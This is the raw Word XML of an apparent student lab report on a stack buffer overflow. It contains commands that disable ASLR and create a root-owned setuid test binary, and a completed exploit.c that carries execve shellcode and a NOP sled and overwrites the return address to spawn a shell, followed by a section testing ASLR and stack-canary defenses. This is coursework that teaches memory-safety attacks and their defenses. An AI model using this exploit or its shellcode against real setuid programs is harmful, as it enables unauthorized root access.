          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>Objective: Build an exploit (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>) and exploit the vulnerable program to gain a shell. Complete the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve">provided </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>exploit.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> template and demonstrate successful exploitation</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA09FAA" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="219"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1A21EA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  <w:tab w:val="left" w:pos="5500"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:spacing w:before="211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sysctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>kernel.randomize</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_va_space</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">(Disable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ASLR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1893C9BA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stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21887C6B" w14:textId="38CA94D8" w:rsidR="005A4576" w:rsidRP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-m32 -o exploit </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>exploit.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0C19CA60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60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r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54756C83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exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D0BACD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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5D9B22D0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xxd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badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23936553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ln -sf /bin/bash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="68A2D9DF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r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4A8D2D1B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stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250850A2" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="719"/>
          <w:tab w:val="left" w:pos="4487"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:spacing w:before="48" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="719" w:hanging="359"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>kernel.randomize</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_va_space</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">(Re-enable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ASLR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40765369" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="168DB07B" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8201D5" w14:textId="6ACDFA6C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sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Screenshots</w:t>
      </w:r>
      <w:r w:rsidR="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Step 3)</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2CE717" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4484C773" w14:textId="77777777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EF9857" wp14:editId="639BAF36">
            <wp:extent cx="6172200" cy="3977005"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="12163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7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46E" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BC11874" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="176B4615" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="175722D5" w14:textId="77777777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8A786D" wp14:editId="3B04693B">
            <wp:extent cx="6172200" cy="4008120"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1752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78E8" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5203A815" w14:textId="77777777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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="065C7FC6" wp14:editId="5956F3D7">
            <wp:extent cx="6172200" cy="4324350"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13935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82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B3C7" w14:textId="77777777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54BA02" wp14:editId="2ED5223C">
            <wp:extent cx="6172200" cy="4192270"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="4661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3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F6A" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="195A07A7" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52C8A523" w14:textId="5FD85209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5B0BA6" wp14:editId="08D00CD9">
            <wp:extent cx="6172200" cy="4103370"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10006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8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D0E6" w14:textId="1A4EB383" w:rsid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noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58496DD3" wp14:editId="641F7D70">
            <wp:extent cx="6172200" cy="4435475"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="18355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42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60C6" w14:textId="31C797AD" w:rsidR="005A4576" w:rsidRDefault="00C53DF4" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Video recording of successful exploit demonstration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6AB5CB" w14:textId="366622DA" w:rsidR="00C53DF4" w:rsidRDefault="00C35DE6" w:rsidP="005A457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53D1DA" wp14:editId="35A644B4">
            <wp:extent cx="4067175" cy="3848100"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="20613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9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F07B" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="346F0E4F" w14:textId="4396483D" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="005A45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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3FE756" w14:textId="2391DD35" w:rsidR="00C35DE6" w:rsidRPr="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C35DE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang/>
        </w:rPr>
        <w:t>Completed exploit.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="749ACAC5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#include &lt;stdlib.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7161E392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#include &lt;stdio.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5364498E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#include &lt;string.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4966AD9E" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRPr="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="031F68DC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char shellcode[]=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670666F5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"\x31\xc0"              /* xor  %eax,%eax     */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA8B732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"\x50"                  /* push %eax          */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1288E31E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"\x68""//sh"            /* push $0x68732f2f   */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287DA362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"\x68""/bin"            /* push $0x6e69622f   */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F1A3E4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"\x89\xe3"              /* mov  %esp,%ebx     */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2951FF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"\x50"                  /* push %eax          */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3B7A54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lastRenderedPageBreak/>
        <w:t>"\x53"                  /* push %ebx          */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D0C86D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"\x89\xe1"              /* mov  %esp,%ecx     */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA5C441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"\x99"                  /* cdq                */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4566D677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"\xb0\x0b"              /* mov  $0x0b,%al     */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153E7FF4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"\xcd\x80";             /* int  $0x80         */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BF7CA0" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRPr="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621CB674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void main(int argc, char **argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0290600E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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C19961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char buffer[517];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59260318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FILE *badfile;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22518D02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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9B3EAC" w14:textId="5C1BA75B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Initializ</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C35DE6">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang/>
        </w:rPr>
        <w:t xml:space="preserve"> buffer with NOP sled */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C0281F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memset(&amp;buffer, 0x90, 517);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D00CB8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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0584D86C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Place shellcode in the buffer (after some NOPs for flexibility) */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546F5816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memcpy(buffer + 100, shellcode, sizeof(shellcode));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E932E51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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F64A998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Overwrite return address - adjust based on your system */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CB3A0F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This address should point somewhere in the NOP sled */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367F2572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Typical addresses: 0xbffff4c0 or similar */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CC51A4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long *addr_ptr = (long *)(buffer + 24);  /* 12 (buffer) + 4 (saved EBP) + 8 (alignment) */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2764E881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long ret_addr = 0xbffff4c0;  /* Adjust this address based on your system */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6538743A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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CFCD55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int i;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C04FDCF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for (i = 24; i &lt; 500; i += 4) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4689D66D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    *(long *)(buffer + i) = ret_addr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F3E07A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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F769BC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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA01ABA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/* Write the exploit to badfile */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152E2BB6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badfile = fopen("./badfile", "w");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274FAC4D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fwrite(buffer, 517, 1, badfile);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3691CEE1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 xml:space="preserve">    fclose(badfile);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BA5D77" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRPr="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C35DE6">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F359E94" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="653D4E90" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18B9E326" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Question 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4BE92B" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B556521" w14:textId="3FF98112" w:rsidR="005A4576" w:rsidRPr="00C35DE6" w:rsidRDefault="005A4576" w:rsidP="00C35DE6">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Objective: </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Evaluate standard protection mechanisms and show how they affect the exploit. The protections to test: /bin/bash linkage, ASLR (address space layout randomization), and Stack Guard/Canary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5D39F7" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="219"/>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E970DAC" w14:textId="36156F57" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="219"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F45CE8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218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r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="009D34A5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stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F95FA8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r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED76EF8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sysctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>kernel.randomize</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_va_space</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>=2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C91B9E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stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03352D68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-m32 -g -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack_protected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stack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2A1B9A51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chown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root:root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stack_protected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7FFBDD5B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4755 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack_protected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7C67EB49" w14:textId="77777777" w:rsid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3" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ls -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack_protected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="39BA39D8" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack_protected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6C7D0436" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FD8EF3A" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576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sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="461EFF12" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="60"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>Screenshots:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2C3BD2" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
